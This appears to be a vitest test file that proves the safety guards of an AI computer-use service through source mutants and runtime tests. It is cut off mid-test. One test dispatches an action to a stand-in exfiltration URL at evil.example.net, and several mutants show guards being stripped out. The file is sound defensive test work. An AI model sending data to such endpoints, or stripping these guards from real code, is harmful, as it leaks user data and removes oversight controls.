/**
 * Discrimination: the governed computer-use boundaries (WORK-027,
 * CUI-001/002/003; checkpoint contracts SELF-HOSTING-BOUNDARY,
 * EXECUTION-PROVENANCE, CONCURRENCY-CRASH-SAFETY).
 *
 * The REQUIRED SAFETY PROOFS (labeled S1..S14). Every protection has
 * BOTH halves (the house style):
 *
 *   STATIC mutants mutate the REAL source in memory; the probe scanners
 *   below must flag exactly the weakened protection (a mutant that
 *   removes or reorders a guard is caught without touching the clean
 *   tree, which always scans clean);
 *
 *   RUNTIME reds observe the governed in-memory world (the REAL service
 *   + the migration-0023-faithful store + the simulated isolated
 *   environment) under constructed scenarios and stay red (the negative
 *   behavior is asserted as the permanent expected outcome).
 *
 * Proof map (proof → mutant → runtime red):
 *   S1  policy/tenant denial before   admission-gate-removed /
 *       ANY external side effect      admission-order (policy→budget→
 *                                   capability→secret→durable→env-open)
 *                                   + tenant-binding-removed
 *                                   policy/budget/capability/secret
 *                                   denials + cross-tenant binding:
 *                                   ZERO environment activity
 *   S2  unregistered/fabricated       registry-resolution-removed
 *       capability dispatch denial    unregistered + fabricated ids:
 *                                   CAPABILITY_UNAVAILABLE, zero env
 *   S3  deterministic-first           sufficient-route-degraded /
 *       zero-GUI-dispatch             route-check-removed
 *                                   a verified covering deterministic
 *                                   candidate yields a deterministic-ONLY
 *                                   route: zero browser/desktop dispatch
 *                                   (environment journal all-deterministic)
 *   S4  escalation follows the        ladder-check-removed /
 *       frozen ladder with RECORDED   insufficiency-verification-removed
 *       evidence                      skipping + fabricated + tampered +
 *                                   succeeded-action escalations all fail
 *                                   closed; a sufficient route is never
 *                                   displaced
 *   S5  no ambient host inheritance   isolation-verdict-removed (service)
 *                                   + ambient-inheritance-opened (adapter)
 *                                   contexts report ZERO inherited host
 *                                   state; the hostile host world's
 *                                   cookies/credentials/env/mounts/sockets
 *                                   never appear in any context or
 *                                   observation
 *   S6  egress confinement before     egress-check-removed
 *       dispatch                      an off-allowlist host is refused
 *                                   before ANY environment effect
 *   S7  secret mediation is           mediation-gate-removed
 *       REQUIRED + reference-only     required-secret-without-connection
 *                                   and refused mediation: typed denial,
 *                                   zero environment activity; secret-
 *                                   bearing observation content is
 *                                   refused before persistence
 *   S8  budget admission before       budget-gate-removed
 *       any spend                     costed route without authority:
 *                                   BUDGET_EXCEEDED, zero env; usage
 *                                   exceeding the admitted ceiling is
 *                                   denied
 *   S9  isolation/secrets never leak  content-serialization-removed?
 *       through public serialization  the public observation evidence
 *                                   carries digests + metadata ONLY
 *   S10 keyed crash-safe operations   replay-branch-removed /
 *       + replay fingerprint          replay-fingerprint-removed
 *                                   arbitration                    duplicate
 *                                   create/dispatch/escalate converge
 *                                   (one external effect per key); a
 *                                   same-key/different-body action fails
 *                                   closed IDEMPOTENCY_KEY_REUSED
 *   S11 no vendor literals            vendor-literal-injected
 *                                   the neutrality scanner flags any
 *                                   computer-use vendor identifier/literal
 *   S12 no second execution state     execution-transition-added
 *       machine                       the store port carries no
 *                                   execution-transition vocabulary;
 *                                   provenance rides ONLY the canonical
 *                                   ledger (tool-requested/result/denied)
 *   S13 terminal through the sandbox  terminal-seam-bypassed
 *       seam (argv, never a shell)    shell-style commands never reach
 *                                   the terminal seam; the sandbox
 *                                   execution identity is durable
 *   S14 migration 0023 physical       migration-guard-removed
 *       guards                        the frozen vocabularies + ladder +
 *                                   append-only + operation discipline
 *                                   are physically enforced (CHECKs and
 *                                   triggers present in the migration)
 */

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, test } from "vitest";
import {
  canonicalComputerUseJson,
  serializeObservationEvidence,
} from "../../src/modules/tools/public";
import {
  browserDeclaration,
  createInMemoryComputerUseWorld,
  desktopDeclaration,
  deterministicDeclaration,
  expectPlatformError,
  sha256Hex,
} from "../unit/tools/computer-use-world";

const REPO_ROOT = join(process.cwd());
const SERVICE_PATH = "src/modules/tools/application/computer-use-service.ts";
const DOMAIN_PATH = "src/modules/tools/domain/computer-use.ts";
const STORE_PORT_PATH = "src/modules/tools/ports/computer-use-store.ts";
const ENVIRONMENT_PORT_PATH = "src/modules/tools/ports/computer-use-environment.ts";
const SIMULATED_ADAPTER_PATH = "src/modules/tools/adapters/simulated-computer-use-environment.ts";
const MIGRATION_PATH = "src/platform/db/migrations/0023_computer_use_sessions.sql";
const SERVICE_SOURCE = readFileSync(join(REPO_ROOT, SERVICE_PATH), "utf8");
const DOMAIN_SOURCE = readFileSync(join(REPO_ROOT, DOMAIN_PATH), "utf8");
const STORE_PORT_SOURCE = readFileSync(join(REPO_ROOT, STORE_PORT_PATH), "utf8");
const ENVIRONMENT_PORT_SOURCE = readFileSync(join(REPO_ROOT, ENVIRONMENT_PORT_PATH), "utf8");
const SIMULATED_ADAPTER_SOURCE = readFileSync(join(REPO_ROOT, SIMULATED_ADAPTER_PATH), "utf8");
const MIGRATION_SOURCE = readFileSync(join(REPO_ROOT, MIGRATION_PATH), "utf8");

/** Computer-use vendor identifiers (the S11 scanner). */
const COMPUTER_USE_VENDOR_IDENTIFIER =
  /\b(Playwright|Selenium|Puppeteer|Cypress|Browserbase|BrowserStack|Appium|VNC|noVNC|xdotool|pyautogui|playwright|selenium|puppeteer|cypress|browserbase|browserstack|appium|novnc|xdotool|pyautogui)\w*/;
const COMPUTER_USE_RAIL_LITERAL =
  /["'](playwright|selenium|puppeteer|cypress|browserbase|browserstack|appium|vnc|novnc|xdotool|pyautogui|rdp)["']/;

interface ComputerUseRules {
  readonly service: string;
  readonly createBody: string;
  readonly escalateBody: string;
  readonly dispatchBody: string;
  readonly domain: string;
  readonly routeFunction: string;
  readonly storePort: string;
  readonly environmentPort: string;
  readonly simulatedAdapter: string;
  readonly migration: string;
}

/** The createSession body: from its declaration to the dispatchAction section. */
function sectionOf(source: string, startMarker: string, endMarker: string): string {
  const start = source.indexOf(startMarker);
  if (start === -1) {
    throw new Error(`section start not found: ${startMarker}`);
  }
  const end = source.indexOf(endMarker, start);
  return source.slice(start, end === -1 ? source.length : end);
}

function rulesFrom(
  service: string,
  domain: string = DOMAIN_SOURCE,
  storePort: string = STORE_PORT_SOURCE,
  environmentPort: string = ENVIRONMENT_PORT_SOURCE,
  simulatedAdapter: string = SIMULATED_ADAPTER_SOURCE,
  migration: string = MIGRATION_SOURCE,
): ComputerUseRules {
  return {
    service,
    createBody: sectionOf(service, "const createSession = async (", "  // dispatchAction"),
    escalateBody: sectionOf(service, "const escalate = async (", "  // terminate"),
    dispatchBody: sectionOf(service, "const dispatchAction = async (", "  // escalate"),
    domain,
    routeFunction: sectionOf(
      domain,
      "export function evaluateComputerUseRoute",
      "function coversRequirements",
    ),
    storePort,
    environmentPort,
    simulatedAdapter,
    migration,
  };
}

const cleanRules = (): ComputerUseRules =>
  rulesFrom(
    SERVICE_SOURCE,
    DOMAIN_SOURCE,
    STORE_PORT_SOURCE,
    ENVIRONMENT_PORT_SOURCE,
    SIMULATED_ADAPTER_SOURCE,
    MIGRATION_SOURCE,
  );

const mutateService = (mutation: (content: string) => string): ComputerUseRules =>
  rulesFrom(mutation(SERVICE_SOURCE));
const mutateDomain = (mutation: (content: string) => string): ComputerUseRules =>
  rulesFrom(SERVICE_SOURCE, mutation(DOMAIN_SOURCE));
const mutateStorePort = (mutation: (content: string) => string): ComputerUseRules =>
  rulesFrom(SERVICE_SOURCE, DOMAIN_SOURCE, mutation(STORE_PORT_SOURCE));
const mutateEnvironmentPort = (mutation: (content: string) => string): ComputerUseRules =>
  rulesFrom(SERVICE_SOURCE, DOMAIN_SOURCE, STORE_PORT_SOURCE, mutation(ENVIRONMENT_PORT_SOURCE));
const mutateSimulatedAdapter = (mutation: (content: string) => string): ComputerUseRules =>
  rulesFrom(
    SERVICE_SOURCE,
    DOMAIN_SOURCE,
    STORE_PORT_SOURCE,
    ENVIRONMENT_PORT_SOURCE,
    mutation(SIMULATED_ADAPTER_SOURCE),
  );
const mutateMigration = (mutation: (content: string) => string): ComputerUseRules =>
  rulesFrom(
    SERVICE_SOURCE,
    DOMAIN_SOURCE,
    STORE_PORT_SOURCE,
    ENVIRONMENT_PORT_SOURCE,
    SIMULATED_ADAPTER_SOURCE,
    mutation(MIGRATION_SOURCE),
  );

// ---------------------------------------------------------------------------
// The static probe: violations over the (possibly mutated) REAL source.
// ---------------------------------------------------------------------------

function violationsOf(rules: ComputerUseRules): string[] {
  const violations: string[] = [];
  const codeOnly = (content: string): string =>
    content.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");

  // S1 — the admission chain must run BEFORE the durable session row and
  // the environment open, in the frozen order, with the tenant binding
  // first and the registry resolution before the route evaluation.
  // The admission chain order is measured over the POST-REPLAY flow (the
  // replay convergence path legitimately resolves the session's capability
  // before a NEW session's identity binding).
  const admissionFlow = rules.createBody.slice(
    rules.createBody.indexOf("Identity/tenant + execution binding"),
  );
  const order: ReadonlyArray<readonly [string, number]> = [
    ["ledger.getExecution(", admissionFlow.indexOf("ledger.getExecution(")],
    ["registry.resolve(", admissionFlow.indexOf("registry.resolve(")],
    ["policy.admit(", admissionFlow.indexOf("policy.admit(")],
    ["budgetAuthority.reserve(", admissionFlow.indexOf("budgetAuthority.reserve(")],
    ["capabilities.resolve(", admissionFlow.indexOf("capabilities.resolve(")],
    ["secrets.mediate(", admissionFlow.indexOf("secrets.mediate(")],
    ["store.insertSession(", admissionFlow.indexOf("store.insertSession(")],
  ];
  for (const [label, index] of order) {
    if (index === -1) {
      violations.push(`admission-missing:${label}`);
    }
  }
  for (let i = 1; i < order.length; i += 1) {
    const previous = order[i - 1];
    const current = order[i];
    if (previous === undefined || current === undefined) {
      continue;
    }
    if (previous[1] !== -1 && current[1] !== -1 && previous[1] > current[1]) {
      violations.push(`admission-order:${previous[0]}-after-${current[0]}`);
    }
  }
  // The tenant guard on the execution binding.
  if (!rules.createBody.includes("execution.tenantId !== request.actor.tenantId")) {
    violations.push("tenant-binding-removed");
  }
  // The policy DENIAL branch (the gate — journal-then-fail).
  if (!rules.createBody.includes("if (!policyDecision.allowed) {")) {
    violations.push("policy-denial-branch-removed");
  }
  // The environment open happens only AFTER the durable session row (the
  // LAST durable admission write precedes the first external interaction).
  const envOpenAt = rules.createBody.lastIndexOf("openEnvironment(");
  const insertAt = rules.createBody.indexOf("store.insertSession(");
  if (envOpenAt === -1 || insertAt === -1 || envOpenAt < insertAt) {
    violations.push("environment-open-before-durable-state");
  }
  // The journal-then-fail denial discipline exists.
  if (!rules.createBody.includes("denySession(")) {
    violations.push("denial-journal-removed");
  }

  // S1/S4 — the isolation verdict on the opened context (ambient host
  // state inherited => fail closed) must exist in the env-open flow.
  if (!rules.service.includes("opened.inheritedHostState.length > 0")) {
    violations.push("isolation-verdict-removed");
  }

  // S2 — registry resolution of EVERY candidate id must precede the
  // route evaluation (an unregistered id fails closed).
  if (
    !/for \(const capabilityId of request\.candidates\.deterministic\) \{\s*\n\s*const declaration = await registry\.resolve\(capabilityId\);\s*\n\s*if \(declaration === null\) \{/.test(
      rules.createBody,
    )
  ) {
    violations.push("registry-resolution-removed");
  }

  // S3 — the sufficient decision produces a deterministic-ONLY route.
  if (!rules.routeFunction.includes('if (decision === "sufficient") {')) {
    violations.push("sufficient-route-degraded");
  }
  if (!rules.routeFunction.includes('route.push({\n      mode: "deterministic",')) {
    violations.push("deterministic-stage-removed");
  }
  // A GUI route never displaces a sufficient deterministic route.
  if (!rules.domain.includes("A GUI route NEVER displaces a sufficient deterministic route")) {
    violations.push("displacement-allowed");
  }

  // S4 — the frozen ladder check + the insufficiency verification.
  if (!rules.domain.includes("escalation must follow the frozen ladder")) {
    violations.push("ladder-check-removed");
  }
  if (
    !rules.service.includes(
      "the insufficiency evidence digest does not match the recorded action outcome",
    )
  ) {
    violations.push("insufficiency-verification-removed");
  }
  if (!rules.service.includes("only a recorded failure of the prior stage justifies escalation")) {
    violations.push("insufficiency-status-removed");
  }
  if (!rules.service.includes("SUFFICIENT deterministic route")) {
    violations.push("sufficient-displacement-guard-removed");
  }

  // S5 — ambient inheritance is unrepresentable in the vocabulary.
  if (!rules.domain.includes('export const AMBIENT_HOST_INHERITANCE = "none" as const;')) {
    violations.push("ambient-inheritance-opened");
  }
  if (
    !rules.domain.includes(
      'export const BROWSER_COOKIE_JAR_POLICY = "session-fresh-empty" as const;',
    )
  ) {
    violations.push("cookie-jar-opened");
  }
  // The adapter reports the isolation introspection.
  if (!rules.environmentPort.includes("readonly inheritedHostState: readonly")) {
    violations.push("isolation-introspection-removed");
  }

  // S6 — the egress confinement check before dispatch.
  if (!rules.dispatchBody.includes("egressConfinementCheck(")) {
    violations.push("egress-check-removed");
  }

  // S7 — secret mediation + the secret-bearing observation refusal.
  if ((rules.createBody.match(/"secret-mediation"/g) ?? []).length < 3) {
    violations.push("mediation-gate-removed");
  }
  if (
    !rules.createBody.includes(
      "requires a mediated credential reference but the request carries none",
    )
  ) {
    violations.push("required-secret-gate-removed");
  }
  if (
    !rules.dispatchBody.includes(
      'serialized.split("\\n").some((line) => containsRawSecretValue(line))',
    )
  ) {
    violations.push("secret-bearing-observation-allowed");
  }

  // S8 — the budget gate (fail-closed for costed routes without an
  // authority; usage guard under the admitted ceiling).
  if (!rules.createBody.includes("costed sessions never execute unbudgeted")) {
    violations.push("budget-gate-removed");
  }
  if (!rules.dispatchBody.includes("usage would exceed the admitted route cost ceiling")) {
    violations.push("budget-usage-guard-removed");
  }

  // S9 — the public observation serialization never carries content.
  if (!codeOnly(rules.domain).includes("export function serializeObservationEvidence(")) {
    violations.push("content-serialization-removed");
  }

  // S10 — the replay fast path + fingerprint arbitration on both axes.
  if (!rules.createBody.includes("store.findSessionByKey(")) {
    violations.push("replay-branch-removed");
  }
  if (!rules.dispatchBody.includes("assertActionReplayFingerprint")) {
    violations.push("replay-fingerprint-removed");
  }
  if (!rules.escalateBody.includes("Committed-escalation replay convergence")) {
    violations.push("escalation-replay-convergence-removed");
  }

  // S11 — vendor neutrality over the whole inspected set.
  for (const [name, content] of [
    ["service", rules.service],
    ["domain", rules.domain],
    ["storePort", rules.storePort],
    ["environmentPort", rules.environmentPort],
    ["simulatedAdapter", rules.simulatedAdapter],
  ] as const) {
    if (content.match(COMPUTER_USE_VENDOR_IDENTIFIER) !== null) {
      violations.push(`vendor-identifier-in:${name}`);
    }
    if (content.match(COMPUTER_USE_RAIL_LITERAL) !== null) {
      violations.push(`vendor-literal-in:${name}`);
    }
  }

  // S12 — no second execution state machine: the store port carries no
  // execution-transition vocabulary; the service's ledger vocabulary is
  // exactly the tools trio.
  for (const forbidden of [
    "markExecutionCompleted(",
    "updateExecutionStatus",
    "execution_status",
  ]) {
    if (rules.storePort.includes(forbidden)) {
      violations.push(`execution-transition-added:${forbidden}`);
    }
  }
  if (
    !codeOnly(rules.service).includes('command: "tool-requested" | "tool-result" | "tool-denied",')
  ) {
    violations.push("ledger-vocabulary-opened");
  }

  // S13 — the terminal dispatch goes through the sandbox seam with the
  // argv discipline; no shell string ever crosses.
  if (!rules.dispatchBody.includes("shell-free command")) {
    violations.push("terminal-argv-discipline-removed");
  }
  if (!rules.service.includes("terminal.execute(")) {
    violations.push("terminal-seam-bypassed");
  }

  // S14 — migration 0023 physical guards.
  for (const guard of [
    "cu_sessions_insert_gate",
    "cu_sessions_core_guard",
    "cu_sessions_lifecycle_guard",
    "escalation ladder only ascends",
    "cu_escalations_append_only",
    "cu_escalations_sequence_gate",
    "cu_actions_sequence_gate",
    "cu_actions_lifecycle_guard",
    "cu_observations_append_only",
    "cu_observations_sequence_gate",
    "cu_ops_core_guard",
    "cu_ops_lifecycle_guard",
    "cu_ops_key_unique",
  ]) {
    if (!rules.migration.includes(guard)) {
      violations.push(`migration-guard-removed:${guard}`);
    }
  }
  // The mode/action vocabularies are physically CHECK-bound.
  if (!rules.migration.includes("cu_session_mode_vocabulary")) {
    violations.push("migration-mode-vocabulary-removed");
  }
  if (!rules.migration.includes("cu_action_type_vocabulary")) {
    violations.push("migration-action-vocabulary-removed");
  }

  return violations;
}

// ---------------------------------------------------------------------------
// The static mutants: each must be flagged; the clean tree scans clean.
// ---------------------------------------------------------------------------

describe("discrimination: computer-use static mutants (the clean tree scans clean)", () => {
  test("the clean tree has zero violations", () => {
    expect(violationsOf(cleanRules())).toEqual([]);
  });

  test("S1: removing the policy gate is flagged", () => {
    const rules = mutateService((source) =>
      source.replace("if (!policyDecision.allowed) {", "if (false) {"),
    );
    expect(violationsOf(rules)).toContain("policy-denial-branch-removed");
  });

  test("S1: removing the budget reservation call is flagged", () => {
    const rules = mutateService((source) =>
      source.replace("budgetAuthority.reserve(", "budgetAuthority.reserveNoop("),
    );
    expect(violationsOf(rules)).toContain("admission-missing:budgetAuthority.reserve(");
  });

  test("S1: removing the tenant binding guard is flagged", () => {
    const rules = mutateService((source) =>
      source.replace("if (execution.tenantId !== request.actor.tenantId) {", "if (false) {"),
    );
    expect(violationsOf(rules)).toContain("tenant-binding-removed");
  });

  test("S1: removing the isolation verdict is flagged", () => {
    const rules = mutateService((source) =>
      source.replace("if (opened.inheritedHostState.length > 0) {", "if (false) {"),
    );
    expect(violationsOf(rules)).toContain("isolation-verdict-removed");
  });

  test("S2: removing the registry resolution is flagged", () => {
    const rules = mutateService((source) =>
      source.replace(
        "const declaration = await registry.resolve(capabilityId);\n      if (declaration === null) {",
        "const declaration = deterministicDeclarations[0] ?? null;\n      if (false) {",
      ),
    );
    expect(violationsOf(rules)).toContain("registry-resolution-removed");
  });

  test("S3: degrading the sufficient route is flagged", () => {
    const rules = mutateDomain((source) =>
      source.replace('if (decision === "sufficient") {', 'if (decision === "never") {'),
    );
    expect(violationsOf(rules)).toContain("sufficient-route-degraded");
  });

  test("S3: removing the deterministic stage push is flagged", () => {
    const rules = mutateDomain((source) =>
      source.replace(
        'route.push({\n      mode: "deterministic",',
        'route.push({\n      mode: "browser",',
      ),
    );
    expect(violationsOf(rules)).toContain("deterministic-stage-removed");
  });

  test("S4: removing the ladder check is flagged", () => {
    const rules = mutateDomain((source) =>
      source.replace("escalation must follow the frozen ladder", "escalation is free-form"),
    );
    expect(violationsOf(rules)).toContain("ladder-check-removed");
  });

  test("S4: removing the insufficiency verification is flagged", () => {
    const rules = mutateService((source) =>
      source.replace(
        "the insufficiency evidence digest does not match the recorded action outcome",
        "digests are advisory",
      ),
    );
    expect(violationsOf(rules)).toContain("insufficiency-verification-removed");
  });

  test("S5: opening ambient inheritance in the vocabulary is flagged", () => {
    const rules = mutateDomain((source) =>
      source.replace(
        'export const AMBIENT_HOST_INHERITANCE = "none" as const;',
        'export const AMBIENT_HOST_INHERITANCE = "inherit" as const;',
      ),
    );
    expect(violationsOf(rules)).toContain("ambient-inheritance-opened");
  });

  test("S5: removing the isolation introspection from the port is flagged", () => {
    const rules = mutateEnvironmentPort((source) =>
      source.replace("readonly inheritedHostState: readonly", "readonly ambientState: readonly"),
    );
    expect(violationsOf(rules)).toContain("isolation-introspection-removed");
  });

  test("S6: removing the egress confinement check is flagged", () => {
    const rules = mutateService((source) =>
      source.replace("egressConfinementCheck(", "egressConfinementCheckDisabled("),
    );
    expect(violationsOf(rules)).toContain("egress-check-removed");
  });

  test("S7: removing the mediation gate is flagged", () => {
    const rules = mutateService((source) =>
      source.replaceAll("secret-mediation", "mediation-disabled"),
    );
    expect(violationsOf(rules)).toContain("mediation-gate-removed");
  });

  test("S7: allowing secret-bearing observation content is flagged", () => {
    const rules = mutateService((source) =>
      source.replaceAll("containsRawSecretValue", "containsNothing"),
    );
    expect(violationsOf(rules)).toContain("secret-bearing-observation-allowed");
  });

  test("S8: removing the budget gate is flagged", () => {
    const rules = mutateService((source) =>
      source.replace(
        "costed sessions never execute unbudgeted",
        "costed sessions execute unbudgeted",
      ),
    );
    expect(violationsOf(rules)).toContain("budget-gate-removed");
  });

  test("S10: removing the replay fingerprint arbitration is flagged", () => {
    const rules = mutateService((source) =>
      source.replaceAll("assertActionReplayFingerprint", "assertActionReplayNoop"),
    );
    expect(violationsOf(rules)).toContain("replay-fingerprint-removed");
  });

  test("S11: injecting a vendor literal into the simulated adapter is flagged", () => {
    const rules = mutateSimulatedAdapter((source) =>
      source.replace(
        "const environmentRef = `cuenv-" + "$" + "{this.openCounter}`;",
        "const environmentRef = `cuenv-" + "$" + "{this.openCounter}`; // playwright rail",
      ),
    );
    expect(violationsOf(rules)).toContain("vendor-identifier-in:simulatedAdapter");
  });

  test("S12: adding an execution-transition method to the store port is flagged", () => {
    const rules = mutateStorePort((source) =>
      source.replace(
        "  // -- the durable operation state -------------------------------------------",
        "  markExecutionCompleted(applicationId: string, executionId: string): Promise<void>;\n\n  // -- the durable operation state -------------------------------------------",
      ),
    );
    expect(violationsOf(rules)).toContain("execution-transition-added:markExecutionCompleted(");
  });

  test("S12: opening the ledger vocabulary is flagged", () => {
    const rules = mutateService((source) =>
      source.replace(
        'command: "tool-requested" | "tool-result" | "tool-denied",',
        'command: "tool-requested" | "tool-result" | "tool-denied" | "execution-completed",',
      ),
    );
    expect(violationsOf(rules)).toContain("ledger-vocabulary-opened");
  });

  test("S13: removing the terminal argv discipline is flagged", () => {
    const rules = mutateService((source) => source.replace("shell-free command", "any command"));
    expect(violationsOf(rules)).toContain("terminal-argv-discipline-removed");
  });

  test("S14: removing a migration guard is flagged", () => {
    const rules = mutateMigration((source) =>
      source.replaceAll("cu_observations_sequence_gate", "cu_observations_gate_disabled"),
    );
    expect(violationsOf(rules)).toContain("migration-guard-removed:cu_observations_sequence_gate");
  });
});

// ---------------------------------------------------------------------------
// The runtime reds: the governed in-memory world under hostile scenarios.
// ---------------------------------------------------------------------------

describe("discrimination: computer-use runtime reds (the negatives stay negative)", () => {
  test("S1 red: policy and budget and capability denials leave the environment journal EMPTY", async () => {
    // Policy.
    const policyWorld = createInMemoryComputerUseWorld();
    await policyWorld.register(deterministicDeclaration());
    await policyWorld.register(browserDeclaration());
    await policyWorld.register(desktopDeclaration());
    const policyExecution = await policyWorld.seedExecution();
    policyWorld.policy.denyWith("no");
    await expectPlatformError(
      "POLICY_DENIED",
      policyWorld.createSession({ executionId: policyExecution }),
    );
    expect(policyWorld.environment.activity()).toHaveLength(0);

    // Budget.
    const budgetWorld = createInMemoryComputerUseWorld();
    await budgetWorld.register(deterministicDeclaration());
    await budgetWorld.register(browserDeclaration());
    await budgetWorld.register(desktopDeclaration());
    const budgetExecution = await budgetWorld.seedExecution();
    budgetWorld.budgets.denyReservations("no funds");
    await expectPlatformError(
      "BUDGET_EXCEEDED",
      budgetWorld.createSession({ executionId: budgetExecution }),
    );
    expect(budgetWorld.environment.activity()).toHaveLength(0);

    // Capability.
    const capabilityWorld = createInMemoryComputerUseWorld();
    await capabilityWorld.register(deterministicDeclaration());
    await capabilityWorld.register(browserDeclaration());
    await capabilityWorld.register(desktopDeclaration());
    const capabilityExecution = await capabilityWorld.seedExecution();
    capabilityWorld.capabilities.failWith(["computer-use-deterministic"]);
    await expectPlatformError(
      "CAPABILITY_UNAVAILABLE",
      capabilityWorld.createSession({ executionId: capabilityExecution }),
    );
    expect(capabilityWorld.environment.activity()).toHaveLength(0);
  });

  test("S1 red: a cross-tenant actor cannot bind a session (typed, zero durable state)", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration());
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    await expectPlatformError(
      "TENANT_SCOPE_VIOLATION",
      world.createSession({
        executionId,
        actor: { actorId: world.actorId, tenantId: world.otherTenantId },
      }),
    );
    expect(world.environment.activity()).toHaveLength(0);
    expect(
      await world.store.listSessionsByExecution(world.applicationId, executionId),
    ).toHaveLength(0);
  });

  test("S2 red: unregistered and fabricated capability ids never dispatch", async () => {
    const unregistered = createInMemoryComputerUseWorld();
    await unregistered.register(browserDeclaration());
    await unregistered.register(desktopDeclaration());
    const unregisteredExecution = await unregistered.seedExecution();
    const unregisteredError = await expectPlatformError(
      "CAPABILITY_UNAVAILABLE",
      unregistered.createSession({ executionId: unregisteredExecution }),
    );
    expect(unregisteredError.message).toContain("is not registered");
    expect(unregistered.environment.activity()).toHaveLength(0);

    const fabricated = createInMemoryComputerUseWorld();
    await fabricated.register(deterministicDeclaration());
    await fabricated.register(browserDeclaration());
    const fabricatedExecution = await fabricated.seedExecution();
    const fabricatedError = await expectPlatformError(
      "CAPABILITY_UNAVAILABLE",
      fabricated.createSession({
        executionId: fabricatedExecution,
        task: {
          kind: "structured-data-retrieval",
          requirementAtoms: ["atom-c"],
          qualityTarget: 0.9,
        },
      }),
    );
    expect(fabricatedError.message).toContain("computer-use-desktop-isolated");
    expect(fabricated.environment.activity()).toHaveLength(0);
  });

  test("S3 red: a sufficient deterministic route produces ZERO GUI dispatches (the environment journal is all-deterministic)", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration());
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({ executionId });
    expect(receipt.routeEvidence.deterministicFirst).toBe("sufficient");
    // Dispatch deterministic actions; the GUI stages stay untouched.
    for (let index = 0; index < 3; index += 1) {
      const result = await world.dispatch(receipt.sessionId, {
        actionType: "api-call",
        target: "api.example.com/v1/data",
        input: { index },
      });
      expect(result.status).toBe("succeeded");
      expect(result.mode).toBe("deterministic");
    }
    // The proof: every environment interaction happened in the
    // deterministic mode — zero browser/desktop dispatches, zero GUI
    // contexts opened.
    for (const entry of world.environment.activity()) {
      expect(entry.mode).toBe("deterministic");
    }
    expect(world.environment.activity().filter((entry) => entry.operation === "open")).toHaveLength(
      1,
    );
  });

  test("S4 red: skipping the ladder, fabricated digests, tampered evidence and sufficient-route displacement all fail closed", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration({ qualityConfidence: "estimated" }));
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({ executionId });

    // Skipping: deterministic -> desktop.
    await expectPlatformError(
      "POLICY_DENIED",
      world.service.escalate(
        world.applicationId,
        receipt.sessionId,
        {
          targetMode: "desktop",
          insufficiency: {
            stage: "deterministic",
            reasonCode: "skip",
            reasonDetail: "skipping the browser rung",
            failedActionId: null,
            evidenceDigest: null,
          },
        },
        "red-skip",
      ),
    );

    // Fabricated action reference.
    await expectPlatformError(
      "POLICY_DENIED",
      world.service.escalate(
        world.applicationId,
        receipt.sessionId,
        {
          targetMode: "browser",
          insufficiency: {
            stage: "deterministic",
            reasonCode: "fabricated",
            reasonDetail: "no such action",
            failedActionId: "00000000-0000-7000-8000-0000000000ff",
            evidenceDigest: "0".repeat(64),
          },
        },
        "red-fabricated",
      ),
    );

    // A real failed action with a tampered digest.
    world.environment.injectNextActionFailure();
    const failed = await world.dispatch(receipt.sessionId, {
      actionType: "api-call",
      target: "api.example.com/v1/data",
      input: {},
    });
    expect(failed.status).toBe("failed");
    await expectPlatformError(
      "POLICY_DENIED",
      world.service.escalate(
        world.applicationId,
        receipt.sessionId,
        {
          targetMode: "browser",
          insufficiency: {
            stage: "deterministic",
            reasonCode: "tampered",
            reasonDetail: "digest does not match",
            failedActionId: failed.actionId,
            evidenceDigest: sha256Hex("tampered"),
          },
        },
        "red-tampered",
      ),
    );
    expect(await world.store.listEscalations(world.applicationId, receipt.sessionId)).toHaveLength(
      0,
    );
  });

  test("S4 red: a SUFFICIENT deterministic route is never displaced without recorded insufficiency", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration());
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({ executionId });
    expect(receipt.routeEvidence.deterministicFirst).toBe("sufficient");
    await expectPlatformError(
      "POLICY_DENIED",
      world.service.escalate(
        world.applicationId,
        receipt.sessionId,
        {
          targetMode: "browser",
          insufficiency: {
            stage: "deterministic",
            reasonCode: "history-prefers-gui",
            reasonDetail: "a GUI route must not displace a sufficient deterministic route",
            failedActionId: null,
            evidenceDigest: null,
          },
        },
        "red-displace",
      ),
    );
  });

  test("S5 red: the hostile host world never leaks into contexts or observations", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration({ covers: ["atom-zzz"] }));
    await world.register(browserDeclaration());
    await world.register(desktopDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({
      executionId,
      task: {
        kind: "structured-data-retrieval",
        requirementAtoms: ["atom-a", "atom-b"],
        qualityTarget: 0.99,
      },
    });
    expect(receipt.mode).toBe("browser");
    // Read the DOM (sensitive-ui observation with retained content).
    const dom = await world.dispatch(receipt.sessionId, {
      actionType: "read-dom",
      target: "https://site.example.com/page",
      input: {},
    });
    expect(dom.status).toBe("succeeded");
    const state = world.environment.contextState(receipt.environmentRef ?? "");
    expect(state?.inheritedHostState).toEqual([]);
    expect(state?.cookies).toEqual([]);
    // None of the host world's values appear anywhere in the durable
    // evidence or the context introspection.
    const observations = await world.store.listObservations(world.applicationId, receipt.sessionId);
    const serialized = JSON.stringify(observations) + JSON.stringify(state);
    for (const item of world.environment.hostWorld().items()) {
      expect(serialized).not.toContain(item.value);
    }
  });

  test("S6 red: an off-allowlist host is refused before any environment effect", async () => {
    const world = createInMemoryComputerUseWorld();
    await world.register(deterministicDeclaration());
    const executionId = await world.seedExecution();
    const receipt = await world.createSession({
      executionId,
      candidates: {
        deterministic: ["computer-use-api-det"],
        browser: null,
        desktop: null,
      },
    });
    await expectPlatformError(
      "POLICY_DENIED",
      world.dispatch(receipt.sessionId, {
        actionType: "api-call",
        target: "https://evil.example.net/exfil",
        input: {},
        host: "evil.example.net",
      }),
    );
    // Only the environment OPEN ever happened.
